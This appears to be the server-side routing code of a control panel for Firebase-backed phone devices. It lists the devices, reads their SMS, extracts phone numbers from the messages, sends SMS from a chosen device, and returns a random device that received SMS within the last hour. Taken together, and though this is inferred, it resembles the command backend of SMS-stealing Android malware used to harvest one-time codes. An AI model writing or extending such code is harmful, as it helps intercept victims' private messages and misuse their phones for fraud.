import { Router, type IRouter } from "express";
import { db, panelsTable } from "@workspace/db";
import { eq } from "drizzle-orm";
import {
  extractPhoneFromSms,
  fetchDeviceSms,
  fetchPanelDevices,
  getLatestSmsTimestamp,
  sendSmsViaFirebase,
  type FirebaseDevice,
  type FirebaseSmsMessage,
} from "../lib/firebase";
import { notifyBulkPanelsAdded, notifyNewPanel } from "../lib/notifications";
import {
  CreatePanelBody,
  DeletePanelParams,
  GetPanelDevicesParams,
} from "@workspace/api-zod";

const router: IRouter = Router();
const ADMIN_RANDOM_PANEL_TIMEOUT_MS = 6000;

function normalizeFirebaseUrl(url: string): string {
  return url.trim().replace(/\/+$/, "").toLowerCase();
}

async function notifyPanelDevices(panel: typeof panelsTable.$inferSelect): Promise<void> {
  const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
  await notifyNewPanel(panel.name, devices);
}

async function fetchPanelDevicesForAdmin(
  panel: typeof panelsTable.$inferSelect,
): Promise<FirebaseDevice[]> {
  return Promise.race([
    fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name),
    new Promise<FirebaseDevice[]>((resolve) => setTimeout(() => resolve([]), ADMIN_RANDOM_PANEL_TIMEOUT_MS)),
  ]);
}

router.get("/panels", async (_req, res): Promise<void> => {
  const panels = await db.select().from(panelsTable).orderBy(panelsTable.createdAt);
  res.json(
    panels.map((p) => ({
      id: p.id,
      name: p.name,
      firebaseUrl: p.firebaseUrl,
      createdAt: p.createdAt.toISOString(),
    }))
  );
});

router.post("/panels", async (req, res): Promise<void> => {
  const parsed = CreatePanelBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }

  const firebaseUrl = parsed.data.firebaseUrl.trim();
  const existingPanels = await db.select().from(panelsTable);
  const duplicate = existingPanels.find(
    (panel) => normalizeFirebaseUrl(panel.firebaseUrl) === normalizeFirebaseUrl(firebaseUrl),
  );
  if (duplicate) {
    res.status(409).json({ error: "Firebase already exists", panelId: duplicate.id, panelName: duplicate.name });
    return;
  }

  const [panel] = await db
    .insert(panelsTable)
    .values({
      name: parsed.data.name,
      firebaseUrl,
      secretKey: parsed.data.secretKey,
    })
    .returning();

  void notifyPanelDevices(panel).catch(() => undefined);

  res.status(201).json({
    id: panel.id,
    name: panel.name,
    firebaseUrl: panel.firebaseUrl,
    createdAt: panel.createdAt.toISOString(),
    totalDevices: 0,
    onlineDevices: 0,
    offlineDevices: 0,
  });
});

router.post("/panels/bulk", async (req, res): Promise<void> => {
  const rawUrls = Array.isArray(req.body?.firebaseUrls)
    ? req.body.firebaseUrls
    : typeof req.body?.firebaseUrls === "string"
      ? req.body.firebaseUrls.split(/[\n, ]+/)
      : [];
  const firebaseUrls = Array.from(
    new Map(
      rawUrls
        .map((url) => String(url).trim())
        .filter(Boolean)
        .map((url) => [normalizeFirebaseUrl(url), url]),
    ).values(),
  );
  const secretKey = typeof req.body?.secretKey === "string" ? req.body.secretKey.trim() : "";
  const namePrefix = typeof req.body?.namePrefix === "string" && req.body.namePrefix.trim()
    ? req.body.namePrefix.trim()
    : "Firebase Panel";

  if (!firebaseUrls.length || !secretKey) {
    res.status(400).json({ error: "Firebase URLs and auth key are required" });
    return;
  }
  if (firebaseUrls.some((url) => !/^https?:\/\/.+/i.test(url))) {
    res.status(400).json({ error: "One or more Firebase URLs are invalid" });
    return;
  }

  const existing = await db.select().from(panelsTable);
  const existingUrls = new Set(existing.map((panel) => normalizeFirebaseUrl(panel.firebaseUrl)));
  const newUrls = firebaseUrls.filter((url) => !existingUrls.has(normalizeFirebaseUrl(url)));

  if (!newUrls.length) {
    res.status(409).json({
      error: "All Firebase URLs already exist",
      added: 0,
      skipped: firebaseUrls.length,
      panels: [],
    });
    return;
  }

  const startIndex = existing.length + 1;
  const inserted = await db
    .insert(panelsTable)
    .values(newUrls.map((firebaseUrl, index) => ({
      name: `${namePrefix} ${startIndex + index}`,
      firebaseUrl,
      secretKey,
    })))
    .returning();

  void notifyBulkPanelsAdded(inserted.map((panel) => ({ panelName: panel.name, devices: [] }))).catch(() => undefined);

  res.status(201).json({
    added: inserted.length,
    skipped: firebaseUrls.length - inserted.length,
    panels: inserted.map((panel) => ({
      id: panel.id,
      name: panel.name,
      firebaseUrl: panel.firebaseUrl,
      createdAt: panel.createdAt.toISOString(),
      totalDevices: 0,
      onlineDevices: 0,
      offlineDevices: 0,
    })),
  });
});

router.delete("/panels", async (_req, res): Promise<void> => {
  const deleted = await db.delete(panelsTable).returning({ id: panelsTable.id });
  res.json({ deleted: deleted.length });
});

router.get("/panels/random-number", async (_req, res): Promise<void> => {
  const panels = await db.select().from(panelsTable).orderBy(panelsTable.createdAt);
  const oneHourAgo = Date.now() - 60 * 60 * 1000;

  const perPanel = await Promise.allSettled(
    panels.map(async (panel) => {
      const devices = await fetchPanelDevicesForAdmin(panel);
      const eligible: FirebaseDevice[] = [];

      for (const device of devices.filter((item) => item.status)) {
        let latestSmsTimestamp = device.lastSmsTimestampMs;
        let messages: FirebaseSmsMessage[] = [];

        if (latestSmsTimestamp === null) {
          messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, device.id);
          latestSmsTimestamp = getLatestSmsTimestamp(messages);
        }

        if (latestSmsTimestamp !== null && latestSmsTimestamp >= oneHourAgo) {
          if (!device.phoneNumber || device.phoneNumber === "—") {
            if (!messages.length) messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, device.id);
            device.phoneNumber = extractPhoneFromSms(messages) || device.phoneNumber;
          }
          eligible.push(device);
        }
      }

      return eligible;
    }),
  );

  const activeDevices = perPanel.flatMap((result) => result.status === "fulfilled" ? result.value : []);
  if (!activeDevices.length) {
    res.status(404).json({ error: "No active numbers available" });
    return;
  }

  const device = activeDevices[Math.floor(Math.random() * activeDevices.length)];
  res.json({
    deviceId: device.id,
    number: device.phoneNumber && device.phoneNumber !== "—" ? device.phoneNumber : null,
    deviceName: device.name || device.model || device.id,
    panelId: device.panelId,
    panelName: device.panelName,
    status: device.status ? "online" : "offline",
    battery: device.battery || "—",
    totalSms: device.totalSms,
    lastSeen: device.lastSeen,
  });
});

router.delete("/panels/:id", async (req, res): Promise<void> => {
  const raw = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
  const params = DeletePanelParams.safeParse({ id: parseFloat(raw) });
  if (!params.success) {
    res.status(400).json({ error: "Invalid ID" });
    return;
  }
  const [deleted] = await db
    .delete(panelsTable)
    .where(eq(panelsTable.id, params.data.id))
    .returning();
  if (!deleted) {
    res.status(404).json({ error: "Panel not found" });
    return;
  }
  res.sendStatus(204);
});

router.get("/panels/:id/devices", async (req, res): Promise<void> => {
  const raw = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
  const params = GetPanelDevicesParams.safeParse({ id: parseFloat(raw) });
  if (!params.success) {
    res.status(400).json({ error: "Invalid ID" });
    return;
  }
  const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, params.data.id));
  if (!panel) {
    res.status(404).json({ error: "Panel not found" });
    return;
  }
  const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
  res.json(devices.map((d) => ({
    id: d.id,
    name: d.name,
    status: d.status,
    phoneNumber: d.phoneNumber,
    battery: d.battery,
    model: d.model,
    lastSeen: d.lastSeen,
    simCount: d.simCount,
    totalSms: d.totalSms,
    panelId: d.panelId,
    panelName: d.panelName,
  })));
});

router.get("/panels/:id/devices/:deviceId/sms", async (req, res): Promise<void> => {
  const raw = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
  const params = GetPanelDevicesParams.safeParse({ id: parseFloat(raw) });
  const deviceId = String(req.params.deviceId || "").trim();
  if (!params.success || !deviceId) {
    res.status(400).json({ error: "Invalid panel or device ID" });
    return;
  }
  const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, params.data.id));
  if (!panel) {
    res.status(404).json({ error: "Panel not found" });
    return;
  }
  const messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, deviceId);
  res.json({
    panelId: panel.id,
    panelName: panel.name,
    deviceId,
    total: messages.length,
    messages: messages.slice(0, 50),
  });
});

router.post("/panels/:id/devices/:deviceId/send-sms", async (req, res): Promise<void> => {
  const raw = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
  const params = GetPanelDevicesParams.safeParse({ id: parseFloat(raw) });
  const deviceId = String(req.params.deviceId || "").trim();
  const to = typeof req.body?.to === "string" ? req.body.to.trim() : "";
  const message = typeof req.body?.message === "string" ? req.body.message.trim() : "";
  const simSlot = Number(req.body?.simSlot || 1);
  if (!params.success || !deviceId || !to || !message) {
    res.status(400).json({ error: "Panel, device, number and message are required" });
    return;
  }
  const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, params.data.id));
  if (!panel) {
    res.status(404).json({ error: "Panel not found" });
    return;
  }
  const ok = await sendSmsViaFirebase(panel.firebaseUrl, panel.secretKey, deviceId, to, message, simSlot || 1);
  if (!ok) {
    res.status(502).json({ error: "SMS command failed" });
    return;
  }
  res.json({ ok: true });
});

export default router;
